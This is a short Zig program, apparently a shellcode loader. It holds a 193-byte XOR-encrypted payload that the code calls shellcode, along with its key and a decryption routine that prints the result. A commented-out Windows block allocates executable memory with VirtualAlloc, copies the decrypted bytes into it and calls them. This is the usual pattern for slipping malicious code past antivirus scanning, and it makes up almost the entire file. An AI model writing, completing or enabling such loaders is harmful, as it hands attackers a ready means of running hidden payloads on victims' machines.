const std = @import("std");

const XOR_KEY: [16]u8 = [_]u8{
    0x6c, 0x9b, 0x8c, 0x01, 0x0f, 0xa6, 0xda, 0x78, 0xde, 0xb4, 0xef, 0xc6, 0xd6, 0x72, 0x50, 0xf4
};

const XOR_CIPHERTEXT: [193]u8 = [_]u8{
    0x90, 0x73, 0x0e, 0x01, 0x0f, 0xa6, 0xba, 0xf1, 0x3b, 0x85, 0x2f, 0xa2, 0x5d, 0x22, 0x60, 0x7f, 
    0x3e, 0x97, 0x07, 0x53, 0x1b, 0x2d, 0xa8, 0x50, 0xd1, 0x03, 0xa5, 0xe0, 0xe7, 0x8d, 0xfc, 0xc8, 
    0x0d, 0xe7, 0x8e, 0x2d, 0x2f, 0x67, 0x15, 0x75, 0xdf, 0x73, 0x0d, 0x34, 0x84, 0x25, 0xdb, 0xa6, 
    0x7c, 0x10, 0xc6, 0x3d, 0x84, 0xea, 0xcb, 0x00, 0x3d, 0xfc, 0xee, 0x17, 0x87, 0xf9, 0x09, 0xd4, 
    0x6d, 0x48, 0x07, 0x48, 0x17, 0x45, 0xe0, 0x31, 0x55, 0x80, 0x64, 0xc7, 0x00, 0x43, 0xaf, 0x58, 
    0xad, 0x54, 0x81, 0x00, 0xc8, 0x9e, 0x3a, 0x0d, 0x28, 0xb7, 0x92, 0x3e, 0xed, 0x0f, 0x74, 0x81, 
    0x88, 0xc3, 0x07, 0x59, 0x2b, 0xa7, 0x09, 0x1e, 0x55, 0xb8, 0xa4, 0x4d, 0x8e, 0x6e, 0x51, 0x27, 
    0xe7, 0x9f, 0x07, 0x00, 0xdf, 0x2f, 0x9e, 0x5c, 0xfa, 0xef, 0xb4, 0xa7, 0x8f, 0x28, 0x01, 0x0b, 
    0x8c, 0xc4, 0xd3, 0x5b, 0x84, 0xb4, 0x31, 0xf5, 0x83, 0xde, 0xee, 0x4b, 0x53, 0xc0, 0x50, 0xf4, 
    0x6c, 0xcb, 0xe4, 0x30, 0x84, 0xc9, 0x5d, 0x87, 0x0b, 0x0f, 0x1f, 0x73, 0x74, 0x24, 0x38, 0x52, 
    0xf9, 0x26, 0x11, 0xfe, 0xda, 0x9a, 0xdc, 0x04, 0xd4, 0x34, 0x14, 0x26, 0xa3, 0x77, 0xeb, 0xb3, 
    0x7f, 0xe9, 0xe3, 0x6b, 0x0f, 0xf5, 0x25, 0xad, 0xbd, 0xd5, 0x83, 0xa5, 0xf8, 0x17, 0x28, 0x91, 
    0x6c
};

/// XOR decryption function - same as encryption since XOR is symmetric
/// Uses multi-byte key and iterates each byte as different key in each iteration
fn xorDecryption(shellcode: []u8, key: []const u8) void {
    const key_len = key.len;
    if (key_len == 0) return; // Avoid division by zero

    var j: usize = 0;
    for (shellcode) |*byte| {
        byte.* = byte.* ^ key[j];
        j += 1;
        if (j >= key_len) {
            j = 0;
        }
    }
}

pub fn main() !void {
    var ciphertext = XOR_CIPHERTEXT;
    xorDecryption(&ciphertext, &XOR_KEY);
    std.debug.print("Decrypted shellcode length: {}\n", .{ciphertext.len});
    std.debug.print("Decrypted shellcode: {any}\n", .{ciphertext});

    // Optional: Execute the shellcode (Windows example)
    // const windows = std.os.windows;
    // const exec_mem = windows.VirtualAlloc(
    //     null,
    //     ciphertext.len,
    //     windows.MEM_COMMIT | windows.MEM_RESERVE,
    //     windows.PAGE_EXECUTE_READWRITE
    // );
    // if (exec_mem) |mem| {
    //     @memcpy(@as([*]u8, @ptrCast(mem))[0..ciphertext.len], ciphertext);
    //     const func: *const fn() callconv(.C) void = @ptrCast(mem);
    //     func();
    // }
}
